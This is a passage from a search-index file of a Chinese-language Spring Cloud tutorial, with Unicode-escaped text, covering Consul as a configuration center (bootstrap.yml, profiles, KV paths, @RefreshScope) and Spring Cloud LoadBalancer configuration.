\u914d\u7f6e\u6587\u4ef6\u7684\u539f\u56e0\u662f\uff0c\u6709\u4e9b\u5c5e\u6027\u662f\u5728\u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u4e4b\u524d\u5c31\u8981\u52a0\u8f7d\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u4e2d\u5fc3\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u800c bootstrap.yml \u5c31\u662f\u7528\u6765\u52a0\u8f7d\u8fd9\u4e9b\u914d\u7f6e\u7684\u3002\u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\uff0c bootstrap.yml \u662f\u5e94\u7528\u7a0b\u5e8f\u7684\u201c\u5f15\u5bfc\u201d\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u5148\u88ab\u52a0\u8f7d\uff0c\u7136\u540e\u518d\u9760\u5b83\u4e2d\u670d\u52a1\u7684\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u9879\u76ee\u7684\u914d\u7f6e\u4fbf\u662f\u7531\u8fd9\u4e09\u90e8\u5206\u5171\u540c\u6784\u6210\u7684\u3002 \u590d\u4e60\u4e00\u4e0b Spring Boot \u7684\u4f18\u5148\u7ea7\u987a\u5e8f\uff0c \u547d\u4ee4\u884c\u53c2\u6570 application.properties\u6216application.yml\uff08\u5728config\u5b50\u76ee\u5f55\u6216\u5f53\u524d\u76ee\u5f55\uff09 application.properties\u6216application.yml\uff08\u5728\u7c7b\u8def\u5f84\u7684\u6839\u76ee\u5f55\uff09 \u901a\u8fc7@PropertySource\u6ce8\u89e3\u52a0\u8f7d\u7684\u5c5e\u6027\u6587\u4ef6 \u9ed8\u8ba4\u5c5e\u6027\uff08\u901a\u8fc7SpringApplication.setDefaultProperties\u6307\u5b9a\uff09 \u5728 Spring Cloud \u4e2d\uff0c\u5bf9\u4e8e\u7b2c\u4e09\u6761\uff0c\u53ef\u4ee5\u7ec6\u5316\u4e3a\uff0c \u672c\u5730\u7684 application.yml \u6216 application.properties \u8fdc\u7a0b\u7684\u914d\u7f6e \u672c\u5730\u7684 bootstrap.yml \u6216 bootstrap.properties \u7531\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u4e0e\u8fde\u63a5\u914d\u7f6e\u4e2d\u5fc3\u76f8\u5173\u7684\u914d\u7f6e\u653e\u5728 bootstrap.yml \u4e2d\uff0c\u800c\u628a\u5176\u4ed6\u7684\u914d\u7f6e\u653e\u5728 application.yml \u6216 Consul \u4e2d\u3002 spring: application: name: payment-service cloud: consul: host: 0.0.0.0 port: 8500 discovery: service-name: ${spring.application.name} config: profile-separator: \"::\" format: yaml \u8fd9\u91cc\u7684 profile-separator \u6211\u4eec\u540e\u9762\u4f1a\u8bb2\u5230\uff0c\u5b83\u9ed8\u8ba4\u662f\u4e00\u4e2a\u9017\u53f7\uff0c\u4f46\u662f\u6587\u4ef6\u540d\u6709\u9017\u53f7\u8fd9\u70b9\u5bf9\u6211\u800c\u8a00\u5c31\u5f88\u602a\uff0c\u6240\u4ee5\u6211\u6539\u6210\u4e86\u53cc\u5192\u53f7\u3002 \u5176\u4ed6\u7684\u90e8\u5206\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5e94\u5f53\u7559\u5728 application.yml \u4e2d\u3002 Spring \u914d\u7f6e\u6587\u4ef6 profile Spring \u7684\u914d\u7f6e\u6587\u4ef6\u4e0d\u6b62\u662f\u8fd9\u70b9\u77e5\u8bc6\uff0c\u6211\u4eec\u8fd8\u8981\u4e86\u89e3 profile\u3002profile \u662f Spring \u7528\u6765\u89e3\u51b3\u4e0d\u540c\u73af\u5883\u4e0b\u914d\u7f6e\u4e0d\u540c\u7684\u95ee\u9898\u7684\u3002\u4f8b\u5982\uff0c\u5f00\u53d1\u73af\u5883\u548c\u751f\u4ea7\u73af\u5883\u7684\u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528 profile \u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 application.yml \u4e2d\u8fd9\u6837\u914d\u7f6e\uff0c spring: profiles: active: dev application.yml \u4f1a\u88ab\u52a0\u8f7d\uff0c\u7136\u540e\u6839\u636e spring.profiles.active \u7684\u503c\uff0c\u52a0\u8f7d application-dev.yml \u3002 bootstrap \u4e5f\u662f\u540c\u7406\u7684\u3002 \u4f7f\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3 \u8981\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 spring-cloud-starter-consul-config \u4f9d\u8d56\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-consul-config' \u6211\u4eec\u5148\u4e3a payment \u670d\u52a1\u505a\u4e00\u4e2a\u4e34\u65f6\u7684 API \u7528\u4e8e\u6d4b\u8bd5\uff0c\u4f8b\u5982\uff0c @RestController public class TestController { @Value(\"${config.info}\") private String configInfo; @GetMapping(\"/config/info\") public ResponseWrapper<String> getConfigInfo() { return configInfo; } } \u7136\u540e\u5728 Consul \u4e2d\u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u3002Consul \u7684\u6587\u4ef6\u5b58\u50a8\u5728 KV \u4e2d\u3002 \u6839\u636e \u6587\u6863 \uff0c\u5728 KV \u5b58\u50a8\u4e2d\uff0c\u914d\u7f6e\u6587\u4ef6\u7684\u8def\u5f84\u5e94\u8be5\u5728\u6587\u4ef6 config/<\u670d\u52a1\u540d><\u5206\u9694\u7b26><profile>/data \u4e0b\uff0c\u5176\u4e2d\u8fd9\u4e2a\u5206\u9694\u7b26\u9ed8\u8ba4\u662f , \uff0c\u4f46\u6211\u4eec\u524d\u9762\u914d\u7f6e\u6210\u4e86\u53cc\u5192\u53f7\u3002 \u8fd9\u4e2a\u6587\u4ef6\u5939\u8fd8\u53ef\u4ee5\u662f\uff0c config/<\u670d\u52a1\u540d><\u5206\u9694\u7b26><profile>/data config/<\u670d\u52a1\u540d>/data config/application<\u5206\u9694\u7b26><profile>/data config/application/data \u6ee1\u8db3\u8d8a\u591a\u6761\u4ef6\u7684\u6587\u4ef6\u5939\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002\u4f8b\u5982\uff0c config/payment-service/data \u4f18\u5148\u7ea7\u9ad8\u4e8e config/application/data \u3002\u8fd9\u91cc\u7684 profile \u548c\u524d\u9762\u4ecb\u7ecd\u7684\u76f8\u540c\u3002 \u9009\u62e9 Create \u521b\u5efa\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002\u6ce8\u610f\uff0c\u5982\u679c\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u540d\u5b57\u540e\u9762\u52a0\u4e0a / \uff0c\u5426\u5219\u4f1a\u88ab\u5f53\u4f5c\u6587\u4ef6\u540d\u3002\u52a0\u4e0a / \u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e0b\u9762\u7684 Value \u6846\u6d88\u5931\u4e86\u3002 \u7136\u540e\u6211\u4eec\u6839\u636e\u4e0a\u9762\u6240\u8ff0\uff0c\u521b\u5efa config/application/data \u6587\u4ef6\uff0c\u5728\u91cc\u9762\u6dfb\u52a0 config.info \u7684\u503c\u3002 \u7136\u540e\uff0c\u6211\u4eec\u914d\u7f6e @RefreshScope \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u8981\u52a0\u8f7d @Configuration \u7c7b\u4e0a\uff0c\u8fd9\u6837 Spring \u624d\u4f1a\u77e5\u9053\u8fd9\u4e2a\u7c7b\u662f\u9700\u8981\u5237\u65b0\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u52a0\u5728\u4e4b\u524d\u7684 TestController \u4e0a\u3002 \u8fd9\u6837\u5f53\u914d\u7f6e\u4e2d\u5fc3\u7684\u914d\u7f6e\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u6211\u4eec\u7684\u670d\u52a1\u4e5f\u4f1a\u81ea\u52a8\u5237\u65b0\u3002\u8fd9\u4e2a\u5237\u65b0\u7684\u9891\u7387\u4e5f\u662f\u53ef\u4ee5\u914d\u7f6e\u7684\uff0c\u5728 bootstrap \u91cc\u6539\u3002 spring: cloud: consul: config: profile-separator: \"::\" format: yaml watch: wait-time: 1 \u9ed8\u8ba4 55 \u79d2\uff0c\u8fd9\u91cc\u6539\u6210 1 \u79d2\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u4e86\u3002","title":"Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3"},{"location":"04/#spring-cloud-ch4-consul","text":"\u4e0a\u4e00\u90e8\u5206\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528 Consul \u4f5c\u4e3a\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0c\u672c\u90e8\u5206\u5c06\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\u3002 \u6ce8\u610f\uff0cConsul \u4f7f\u7528 docker \u90e8\u7f72\u65f6\uff0c\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u4f1a\u5728\u5bb9\u5668\u91cd\u542f\u65f6\u4e22\u5931\u3002","title":"Spring Cloud \u901f\u6210 Ch4 Consul \u914d\u7f6e\u7ba1\u7406"},{"location":"04/#bootstrapyml","text":"application.yml \u662f Spring Boot \u7684\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff0c\u800c bootstrap.yml \u662f Spring Cloud \u7684\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u3002Spring Cloud \u4f1a\u5148\u52a0\u8f7d bootstrap.yml \uff0c\u7136\u540e\u518d\u52a0\u8f7d application.yml \u3002\u56e0\u6b64\uff0c application.yml \u4e2d\u7684\u914d\u7f6e\u4f1a\u8986\u76d6 bootstrap.yml \u4e2d\u7684\u914d\u7f6e\u3002 \u8981\u5f00\u542f bootstrap.yml \u529f\u80fd\uff0c\u9700\u8981\u5f15\u5165 spring-cloud-starter-bootstrap \u4f9d\u8d56\u3002 Spring Cloud \u53c8\u5f15\u5165\u4e00\u4e2a bootstrap.yml \u914d\u7f6e\u6587\u4ef6\u7684\u539f\u56e0\u662f\uff0c\u6709\u4e9b\u5c5e\u6027\u662f\u5728\u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u4e4b\u524d\u5c31\u8981\u52a0\u8f7d\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u4e2d\u5fc3\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u800c bootstrap.yml \u5c31\u662f\u7528\u6765\u52a0\u8f7d\u8fd9\u4e9b\u914d\u7f6e\u7684\u3002\u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\uff0c bootstrap.yml \u662f\u5e94\u7528\u7a0b\u5e8f\u7684\u201c\u5f15\u5bfc\u201d\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u5148\u88ab\u52a0\u8f7d\uff0c\u7136\u540e\u518d\u9760\u5b83\u4e2d\u670d\u52a1\u7684\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u9879\u76ee\u7684\u914d\u7f6e\u4fbf\u662f\u7531\u8fd9\u4e09\u90e8\u5206\u5171\u540c\u6784\u6210\u7684\u3002 \u590d\u4e60\u4e00\u4e0b Spring Boot \u7684\u4f18\u5148\u7ea7\u987a\u5e8f\uff0c \u547d\u4ee4\u884c\u53c2\u6570 application.properties\u6216application.yml\uff08\u5728config\u5b50\u76ee\u5f55\u6216\u5f53\u524d\u76ee\u5f55\uff09 application.properties\u6216application.yml\uff08\u5728\u7c7b\u8def\u5f84\u7684\u6839\u76ee\u5f55\uff09 \u901a\u8fc7@PropertySource\u6ce8\u89e3\u52a0\u8f7d\u7684\u5c5e\u6027\u6587\u4ef6 \u9ed8\u8ba4\u5c5e\u6027\uff08\u901a\u8fc7SpringApplication.setDefaultProperties\u6307\u5b9a\uff09 \u5728 Spring Cloud \u4e2d\uff0c\u5bf9\u4e8e\u7b2c\u4e09\u6761\uff0c\u53ef\u4ee5\u7ec6\u5316\u4e3a\uff0c \u672c\u5730\u7684 application.yml \u6216 application.properties \u8fdc\u7a0b\u7684\u914d\u7f6e \u672c\u5730\u7684 bootstrap.yml \u6216 bootstrap.properties \u7531\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u4e0e\u8fde\u63a5\u914d\u7f6e\u4e2d\u5fc3\u76f8\u5173\u7684\u914d\u7f6e\u653e\u5728 bootstrap.yml \u4e2d\uff0c\u800c\u628a\u5176\u4ed6\u7684\u914d\u7f6e\u653e\u5728 application.yml \u6216 Consul \u4e2d\u3002 spring: application: name: payment-service cloud: consul: host: 0.0.0.0 port: 8500 discovery: service-name: ${spring.application.name} config: profile-separator: \"::\" format: yaml \u8fd9\u91cc\u7684 profile-separator \u6211\u4eec\u540e\u9762\u4f1a\u8bb2\u5230\uff0c\u5b83\u9ed8\u8ba4\u662f\u4e00\u4e2a\u9017\u53f7\uff0c\u4f46\u662f\u6587\u4ef6\u540d\u6709\u9017\u53f7\u8fd9\u70b9\u5bf9\u6211\u800c\u8a00\u5c31\u5f88\u602a\uff0c\u6240\u4ee5\u6211\u6539\u6210\u4e86\u53cc\u5192\u53f7\u3002 \u5176\u4ed6\u7684\u90e8\u5206\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5e94\u5f53\u7559\u5728 application.yml \u4e2d\u3002","title":"bootstrap.yml"},{"location":"04/#spring-profile","text":"Spring \u7684\u914d\u7f6e\u6587\u4ef6\u4e0d\u6b62\u662f\u8fd9\u70b9\u77e5\u8bc6\uff0c\u6211\u4eec\u8fd8\u8981\u4e86\u89e3 profile\u3002profile \u662f Spring \u7528\u6765\u89e3\u51b3\u4e0d\u540c\u73af\u5883\u4e0b\u914d\u7f6e\u4e0d\u540c\u7684\u95ee\u9898\u7684\u3002\u4f8b\u5982\uff0c\u5f00\u53d1\u73af\u5883\u548c\u751f\u4ea7\u73af\u5883\u7684\u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528 profile \u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 application.yml \u4e2d\u8fd9\u6837\u914d\u7f6e\uff0c spring: profiles: active: dev application.yml \u4f1a\u88ab\u52a0\u8f7d\uff0c\u7136\u540e\u6839\u636e spring.profiles.active \u7684\u503c\uff0c\u52a0\u8f7d application-dev.yml \u3002 bootstrap \u4e5f\u662f\u540c\u7406\u7684\u3002","title":"Spring \u914d\u7f6e\u6587\u4ef6 profile"},{"location":"04/#consul","text":"\u8981\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 spring-cloud-starter-consul-config \u4f9d\u8d56\u3002 implementation 'org.springframework.cloud:spring-cloud-starter-consul-config' \u6211\u4eec\u5148\u4e3a payment \u670d\u52a1\u505a\u4e00\u4e2a\u4e34\u65f6\u7684 API \u7528\u4e8e\u6d4b\u8bd5\uff0c\u4f8b\u5982\uff0c @RestController public class TestController { @Value(\"${config.info}\") private String configInfo; @GetMapping(\"/config/info\") public ResponseWrapper<String> getConfigInfo() { return configInfo; } } \u7136\u540e\u5728 Consul \u4e2d\u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u3002Consul \u7684\u6587\u4ef6\u5b58\u50a8\u5728 KV \u4e2d\u3002 \u6839\u636e \u6587\u6863 \uff0c\u5728 KV \u5b58\u50a8\u4e2d\uff0c\u914d\u7f6e\u6587\u4ef6\u7684\u8def\u5f84\u5e94\u8be5\u5728\u6587\u4ef6 config/<\u670d\u52a1\u540d><\u5206\u9694\u7b26><profile>/data \u4e0b\uff0c\u5176\u4e2d\u8fd9\u4e2a\u5206\u9694\u7b26\u9ed8\u8ba4\u662f , \uff0c\u4f46\u6211\u4eec\u524d\u9762\u914d\u7f6e\u6210\u4e86\u53cc\u5192\u53f7\u3002 \u8fd9\u4e2a\u6587\u4ef6\u5939\u8fd8\u53ef\u4ee5\u662f\uff0c config/<\u670d\u52a1\u540d><\u5206\u9694\u7b26><profile>/data config/<\u670d\u52a1\u540d>/data config/application<\u5206\u9694\u7b26><profile>/data config/application/data \u6ee1\u8db3\u8d8a\u591a\u6761\u4ef6\u7684\u6587\u4ef6\u5939\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002\u4f8b\u5982\uff0c config/payment-service/data \u4f18\u5148\u7ea7\u9ad8\u4e8e config/application/data \u3002\u8fd9\u91cc\u7684 profile \u548c\u524d\u9762\u4ecb\u7ecd\u7684\u76f8\u540c\u3002 \u9009\u62e9 Create \u521b\u5efa\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002\u6ce8\u610f\uff0c\u5982\u679c\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u540d\u5b57\u540e\u9762\u52a0\u4e0a / \uff0c\u5426\u5219\u4f1a\u88ab\u5f53\u4f5c\u6587\u4ef6\u540d\u3002\u52a0\u4e0a / \u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e0b\u9762\u7684 Value \u6846\u6d88\u5931\u4e86\u3002 \u7136\u540e\u6211\u4eec\u6839\u636e\u4e0a\u9762\u6240\u8ff0\uff0c\u521b\u5efa config/application/data \u6587\u4ef6\uff0c\u5728\u91cc\u9762\u6dfb\u52a0 config.info \u7684\u503c\u3002 \u7136\u540e\uff0c\u6211\u4eec\u914d\u7f6e @RefreshScope \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u8981\u52a0\u8f7d @Configuration \u7c7b\u4e0a\uff0c\u8fd9\u6837 Spring \u624d\u4f1a\u77e5\u9053\u8fd9\u4e2a\u7c7b\u662f\u9700\u8981\u5237\u65b0\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u52a0\u5728\u4e4b\u524d\u7684 TestController \u4e0a\u3002 \u8fd9\u6837\u5f53\u914d\u7f6e\u4e2d\u5fc3\u7684\u914d\u7f6e\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u6211\u4eec\u7684\u670d\u52a1\u4e5f\u4f1a\u81ea\u52a8\u5237\u65b0\u3002\u8fd9\u4e2a\u5237\u65b0\u7684\u9891\u7387\u4e5f\u662f\u53ef\u4ee5\u914d\u7f6e\u7684\uff0c\u5728 bootstrap \u91cc\u6539\u3002 spring: cloud: consul: config: profile-separator: \"::\" format: yaml watch: wait-time: 1 \u9ed8\u8ba4 55 \u79d2\uff0c\u8fd9\u91cc\u6539\u6210 1 \u79d2\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u4e86\u3002","title":"\u4f7f\u7528 Consul \u4f5c\u4e3a\u914d\u7f6e\u4e2d\u5fc3"},{"location":"05/","text":"Spring Cloud \u901f\u6210 Ch5 Load Balancer \u5728\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u670d\u52a1\u8c03\u7528\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u6765\u5747\u8861\u5404\u4e2a\u670d\u52a1\u7684\u8d1f\u8f7d\u3002Spring Cloud \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u529f\u80fd\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u670d\u52a1\u8c03\u7528\u7684\u5730\u65b9\u52a0\u4e0a @LoadBalanced \u6ce8\u89e3\u5373\u53ef\u3002 \u4e4b\u524d\u6211\u4eec\u4f7f\u7528\u8fc7 RestTemplate \u6765\u8c03\u7528\u670d\u52a1\uff0c\u5e76\u4e14\u52a0\u5165\u4e86 @LoadBalanced \u6ce8\u89e3\u3002\u4f46\u662f\uff0c\u5c31\u50cf\u4e4b\u524d\u6240\u8bf4\u7684\uff0c @LoadBalanced \u6ce8\u89e3\u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u9700\u8981\u4e00\u4e2a\u5b9e\u73b0\u7c7b\u624d\u80fd\u751f\u6548\u3002 \u8fd9\u4e2a @LoadBalanced \u5c5e\u4e8e Spring Cloud Commons \u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u4e00\u4e9b\u63a5\u53e3\uff0c\u4f46\u662f\u6ca1\u6709\u5b9e\u73b0\u7c7b\u3002\u56e0\u6b64\u8981\u770b\u7684\u6587\u6863\u662f \u8fd9\u7bc7 \u3002 Spring Cloud LoadBalancer \u540c\u6837\u7684\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u4e5f\u6709\u5b83\u7684 Sprint Boot\uff0c\u56e0\u6b64\u8981\u5f15\u5165 org.springframework.cloud:spring-cloud-starter-loadbalancer \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 LoadBalancerClient \u6765\u83b7\u53d6\u4e00\u4e2a\u670d\u52a1\u7684\u5b9e\u4f8b\uff0c\u4f8b\u5982\uff0c @Autowired private LoadBalancerClient loadBalancerClient; @GetMapping(\"/payment/lb\") public String getPaymentLB() { ServiceInstance serviceInstance = loadBalancerClient.choose(\"payment-service\"); return serviceInstance.getUri().toString(); } \u4e4b\u524d\u6211\u4eec\u5728 RestTemplate \u4e2d\u4f7f\u7528 @LoadBalanced \u6ce8\u89e3\uff0c\u5c31\u662f\u5728 RestTemplate \u8bbf\u95ee\u524d\uff0c\u5148\u901a\u8fc7 LoadBalancerClient \u83b7\u53d6\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u7136\u540e\u518d\u8bbf\u95ee\u8fd9\u4e2a\u5b9e\u4f8b\u3002 \u8d1f\u8f7d\u5e73\u8861\u7b97\u6cd5 \u8d1f\u8f7d\u5e73\u8861\u5176\u5b9e\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u5ba2\u6237\u7aef\u8d1f\u8f7d\u5747\u8861\uff0c\u4e00\u79cd\u662f\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u3002 \u5ba2\u6237\u7aef\u8d1f\u8f7d\u5e73\u8861\u5373\u662f\u5ba2\u6237\u7aef\u81ea\u5df1\u53bb\u9009\u62e9\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u7136\u540e\u8bbf\u95ee\u8fd9\u4e2a\u5b9e\u4f8b\u3002\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u5219\u662f\u670d\u52a1\u7aef\u7684\u7f51\u5173\u63a5\u53d7\u8bf7\u6c42\uff0c\u7136\u540e\u518d\u8f6c\u53d1\u7ed9\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\u3002\u8fd9\u91cc\u4f7f\u7528\u7684\u5c31\u662f\u5ba2\u6237\u7aef\u8d1f\u8f7d\u5747\u8861\uff0c\u800c\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u53ef\u4ee5\u7528 Nginx \u6765\u5b9e\u73b0\u3002 \u9ed8\u8ba4\u4f7f\u7528\u7684\u7b97\u6cd5\u662f\u8f6e\u8be2\u7b97\u6cd5\uff0c\u5373\u5047\u8bbe\u6709 N \u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u9009\u62e9\u7b2c (N + 1) % N \u4e2a\u670d\u52a1\u5b9e\u4f8b\u3002 \u8981\u5207\u6362\u7b97\u6cd5\uff0c\u5219\u8981\u4fee\u6539 ReactorLoadBalancer<ServiceInstance> \u7684\u914d\u7f6e\uff0c\u4f8b\u5982\uff0c public class CustomLoadBalancerConfiguration { @Bean ReactorLoadBalancer<ServiceInstance> randomLoadBalancer(Environment environment, LoadBalancerClientFactory loadBalancerClientFactory) { String name = environment.getProperty(LoadBalancerClientFactory.PROPERTY_NAME); return new RandomLoadBalancer(loadBalancerClientFactory .getLazyProvider(name, ServiceInstanceListSupplier.class), name); } } \u8fd9\u6837\u5c31\u5207\u6362\u5230\u4e86\u968f\u673a\u7b97\u6cd5\u3002","title":"LoadBalancer"},{"location":"05/#spring-cloud-ch5-load-balancer","text":"\u5728\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\uff0c\u670d\u52a1\u8c03\u7528\u7684\u65f6\u5019\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u6765\u5747\u8861\u5404\u4e2a\u670d\u52a1\u7684\u8d1f\u8f7d\u3002Spring Cloud \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u529f\u80fd\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u670d\u52a1\u8c03\u7528\u7684\u5730\u65b9\u52a0\u4e0a @LoadBalanced \u6ce8\u89e3\u5373\u53ef\u3002 \u4e4b\u524d\u6211\u4eec\u4f7f\u7528\u8fc7 RestTemplate \u6765\u8c03\u7528\u670d\u52a1\uff0c\u5e76\u4e14\u52a0\u5165\u4e86 @LoadBalanced \u6ce8\u89e3\u3002\u4f46\u662f\uff0c\u5c31\u50cf\u4e4b\u524d\u6240\u8bf4\u7684\uff0c @LoadBalanced \u6ce8\u89e3\u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u9700\u8981\u4e00\u4e2a\u5b9e\u73b0\u7c7b\u624d\u80fd\u751f\u6548\u3002 \u8fd9\u4e2a @LoadBalanced \u5c5e\u4e8e Spring Cloud Commons \u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u4e00\u4e9b\u63a5\u53e3\uff0c\u4f46\u662f\u6ca1\u6709\u5b9e\u73b0\u7c7b\u3002\u56e0\u6b64\u8981\u770b\u7684\u6587\u6863\u662f \u8fd9\u7bc7 \u3002","title":"Spring Cloud \u901f\u6210 Ch5 Load Balancer"},{"location":"05/#spring-cloud-loadbalancer","text":"\u540c\u6837\u7684\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u4e5f\u6709\u5b83\u7684 Sprint Boot\uff0c\u56e0\u6b64\u8981\u5f15\u5165 org.springframework.cloud:spring-cloud-starter-loadbalancer \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 LoadBalancerClient \u6765\u83b7\u53d6\u4e00\u4e2a\u670d\u52a1\u7684\u5b9e\u4f8b\uff0c\u4f8b\u5982\uff0c @Autowired private LoadBalancerClient loadBalancerClient; @GetMapping(\"/payment/lb\") public String getPaymentLB() { ServiceInstance serviceInstance = loadBalancerClient.choose(\"payment-service\"); return serviceInstance.getUri().toString(); } \u4e4b\u524d\u6211\u4eec\u5728 RestTemplate \u4e2d\u4f7f\u7528 @LoadBalanced \u6ce8\u89e3\uff0c\u5c31\u662f\u5728 RestTemplate \u8bbf\u95ee\u524d\uff0c\u5148\u901a\u8fc7 LoadBalancerClient \u83b7\u53d6\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u7136\u540e\u518d\u8bbf\u95ee\u8fd9\u4e2a\u5b9e\u4f8b\u3002","title":"Spring Cloud LoadBalancer"},{"location":"05/#_1","text":"\u8d1f\u8f7d\u5e73\u8861\u5176\u5b9e\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u5ba2\u6237\u7aef\u8d1f\u8f7d\u5747\u8861\uff0c\u4e00\u79cd\u662f\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u3002 \u5ba2\u6237\u7aef\u8d1f\u8f7d\u5e73\u8861\u5373\u662f\u5ba2\u6237\u7aef\u81ea\u5df1\u53bb\u9009\u62e9\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u7136\u540e\u8bbf\u95ee\u8fd9\u4e2a\u5b9e\u4f8b\u3002\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u5219\u662f\u670d\u52a1\u7aef\u7684\u7f51\u5173\u63a5\u53d7\u8bf7\u6c42\uff0c\u7136\u540e\u518d\u8f6c\u53d1\u7ed9\u4e00\u4e2a\u670d\u52a1\u5b9e\u4f8b\u3002\u8fd9\u91cc\u4f7f\u7528\u7684\u5c31\u662f\u5ba2\u6237\u7aef\u8d1f\u8f7d\u5747\u8861\uff0c\u800c\u670d\u52a1\u7aef\u8d1f\u8f7d\u5747\u8861\u53ef\u4ee5\u7528 Nginx \u6765\u5b9e\u73b0\u3002 \u9ed8\u8ba4\u4f7f\u7528\u7684\u7b97\u6cd5\u662f\u8f6e\u8be2\u7b97\u6cd5\uff0c\u5373\u5047\u8bbe\u6709 N \u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u9009\u62e9\u7b2c (N + 1) % N 